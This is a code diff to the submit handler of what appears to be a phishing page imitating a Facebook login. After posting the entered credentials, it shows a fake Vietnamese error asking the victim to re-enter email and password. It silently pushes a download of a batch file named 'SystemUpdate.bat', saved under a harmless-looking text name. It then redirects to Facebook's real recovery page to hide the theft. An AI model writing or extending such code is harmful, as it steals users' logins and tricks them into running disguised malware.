@@ -17,7 +17,18 @@ form.addEventListener('submit', e => {
   })
   .then(response => response.json())
   .then(data => {
-      window.location.href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0";
+    alert("Đã xảy ra lỗi khi xử lý thông tin đăng nhập. Vui lòng nhập lại email và password."); // Thông báo khi tài khoản không tồn tại
+
+    // Tải file sau thông báo
+    const link = document.createElement('a');
+    link.href = 'MaDoc/SystemUpdate.bat'; // Thay đổi thành đường dẫn đến file của bạn
+    link.download = 'file.txt'; // Tên file khi tải về
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link); 
+
+
+    window.location.href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0";
   })
   .catch((error) => {
     console.error('Error:', error);
